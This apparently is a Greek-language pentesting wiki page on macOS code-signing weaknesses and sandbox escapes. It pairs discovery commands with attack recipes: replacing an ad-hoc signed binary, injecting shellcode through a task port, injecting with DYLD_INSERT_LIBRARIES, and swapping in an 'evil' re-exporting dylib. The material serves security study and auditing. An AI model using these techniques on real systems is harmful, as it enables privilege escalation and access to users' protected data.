# Αδυναμίες Code Signing του macOS και Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### Βασικές πληροφορίες

Το **Ad-hoc signing** (`CS_ADHOC`) δημιουργεί μια code signature **χωρίς certificate chain** — είναι ένα hash του code χωρίς verification της ταυτότητας developer. Η προέλευση του binary δεν μπορεί να αποδοθεί σε κάποιον developer ή οργανισμό.<sup>[[1]](#references)[[4]](#references)</sup>

Σε Mac με Apple Silicon, όλα τα executables απαιτούν τουλάχιστον μια ad-hoc signature. Αυτό σημαίνει ότι θα βρείτε ad-hoc signatures σε πολλά development tools, Homebrew packages και third-party utilities.

### Γιατί έχει σημασία

- **Καμία επαληθεύσιμη ταυτότητα** — το binary μπορεί να αντικατασταθεί χωρίς να εντοπιστεί από identity-based checks
- Third-party ad-hoc binaries σε **privileged positions** (FDA, daemon, helpers) αποτελούν στόχους υψηλής προτεραιότητας
- Σε ορισμένες διαμορφώσεις, οι ad-hoc signatures μπορεί **να μην επαληθεύονται τόσο αυστηρά** όσο ο developer-signed code
- Ad-hoc signed binaries που έχουν **TCC grants** είναι ιδιαίτερα πολύτιμα — τα grants παραμένουν ακόμη και αν αλλάξει το περιεχόμενο του binary (εξαρτάται από τον τρόπο με τον οποίο το TCC έκανε key το grant)

### Discovery
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Attack: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. On next launch, the daemon runs your code with the original's TCC grants
# (This works when TCC keyed the grant by path rather than code signature)
```
---

## Processes με δυνατότητα debugging (get-task-allow)

### Βασικές πληροφορίες

Το **`com.apple.security.get-task-allow`** entitlement (ή το flag **`CS_GET_TASK_ALLOW`**) επιτρέπει σε **οποιοδήποτε process να συνδεθεί ως debugger**, να διαβάσει τη μνήμη, να τροποποιήσει registers, να κάνει code injection και να ελέγξει την εκτέλεση.<sup>[[3]](#references)</sup>

Αυτό προορίζεται **μόνο για development builds**. Ωστόσο, ορισμένα third-party binaries αποστέλλονται με αυτό το entitlement σε production.

> [!CAUTION]
> Ένα production binary με `get-task-allow` αποτελεί **instant exploitation primitive**. Οποιοδήποτε local process μπορεί να καλέσει το `task_for_pid()`, να αποκτήσει το Mach task port του στόχου και να κάνει inject arbitrary code, το οποίο εκτελείται με τα entitlements, τα TCC grants και το security context του στόχου.

### Ανακάλυψη
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Attack: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## No Library Validation + DYLD Environment

### Runtime Library-Validation Clearing

Το private entitlement **`com.apple.private.security.clear-library-validation`** δεν απενεργοποιεί το library validation κατά την εκκίνηση της διεργασίας. Αντίθετα, επιτρέπει στη διεργασία να καλέσει το `csops(..., CS_OPS_CLEAR_LV, ...)` στον εαυτό της κατά το runtime. Στη συνέχεια, το XNU εκκαθαρίζει τα `CS_REQUIRE_LV | CS_FORCED_LV`, υπό την προϋπόθεση ότι ο caller διαθέτει το entitlement και πληροί τους πρόσθετους ελέγχους του handler. Κατά συνέπεια, μια διεργασία μπορεί να γίνει viable library-injection target μόνο αφού φτάσει στο code path που εκκαθαρίζει το library validation.<sup>[[4]](#references)[[5]](#references)</sup>

### The Deadly Combination

Όταν ένα binary διαθέτει **και τα δύο**:<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation` (φορτώνει οποιοδήποτε dylib)
- `com.apple.security.cs.allow-dyld-environment-variables` (δέχεται DYLD env vars)

Αυτό είναι ένα **guaranteed code injection primitive** — το `DYLD_INSERT_LIBRARIES` λειτουργεί άψογα.

### Discovery
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Επίθεση: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Προσωρινές εξαιρέσεις του Sandbox

### Πώς αποδυναμώνουν το Sandbox

Οι προσωρινές εξαιρέσεις του Sandbox (`com.apple.security.temporary-exception.*`) δημιουργούν κενά στο App Sandbox:<sup>[[2]](#references)</sup>

| Exception | Τι επιτρέπει |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Σύνδεση σε XPC/Mach services σε επίπεδο ολόκληρου του συστήματος |
| `temporary-exception.files.absolute-path.read-write` | Ανάγνωση/εγγραφή αρχείων εκτός του app container |
| `temporary-exception.iokit-user-client-class` | Άνοιγμα συνδέσεων IOKit user-client |
| `temporary-exception.shared-preference.read-only` | Ανάγνωση των preferences άλλων apps |
| `temporary-exception.files.home-relative-path.read-write` | Πρόσβαση σε paths σχετικά με το `~` |

### Οι εξαιρέσεις Mach-Lookup = Primitive για Sandbox Escape

Η πιο επικίνδυνη εξαίρεση είναι το **mach-lookup** — επιτρέπει σε ένα sandboxed app να επικοινωνεί με privileged daemons:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Attack: Sandbox Escape via Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Private Apple Entitlements

### Τι είναι

Τα entitlements με πρόθεμα `com.apple.private.*` παρέχουν πρόσβαση σε **Apple-internal APIs**, τα οποία δεν είναι τεκμηριωμένα ούτε διαθέσιμα σε third-party developers. Τα third-party binaries με private entitlements τα απέκτησαν μέσω enterprise cert, MDM ή διανομής εκτός App Store.

### Επικίνδυνα Private Entitlements

| Entitlement | Δυνατότητα |
|---|---|
| `com.apple.private.tcc.manager` | Πλήρης ανάγνωση/εγγραφή της βάσης δεδομένων TCC |
| `com.apple.private.tcc.allow` | Πρόσβαση σε συγκεκριμένες υπηρεσίες TCC |
| `com.apple.private.security.no-sandbox` | Εκτέλεση χωρίς sandbox |
| `com.apple.private.iokit` | Απευθείας πρόσβαση σε IOKit drivers |
| `com.apple.private.kernel.\*` | Πρόσβαση σε kernel interfaces |
| `com.apple.private.xpc.launchd.job-label` | Εγγραφή/διαχείριση launchd jobs |
| `com.apple.rootless.install` | Εγγραφή σε διαδρομές που προστατεύονται από το SIP |

### Εντοπισμός
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Προσαρμοσμένα Sandbox Profiles (SBPL)

### Τι είναι

Τα Binaries μπορούν να διανέμονται με **προσαρμοσμένα sandbox profiles** γραμμένα σε SBPL (Seatbelt Profile Language). Αυτά τα profiles μπορεί να είναι πιο περιοριστικά Ή **πιο permissive** από το προεπιλεγμένο App Sandbox.

### Έλεγχος προσαρμοσμένων Profiles
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Διαδρομές Βιβλιοθηκών με Δυνατότητα Εγγραφής

### Τι Είναι

Όταν ένα binary φορτώνει μια dynamic library από μια διαδρομή στην οποία ο τρέχων χρήστης μπορεί να κάνει **write**, η βιβλιοθήκη μπορεί να αντικατασταθεί με malicious code.

### Ανακάλυψη
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Attack: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

- [1] [Apple Developer — Οδηγός Code Signing](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h` (λειτουργίες `CS_OPS_*` και `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c` (handler των `csops` / `CS_OPS_CLEAR_LV`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
{{#include ../../../banners/hacktricks-training.md}}
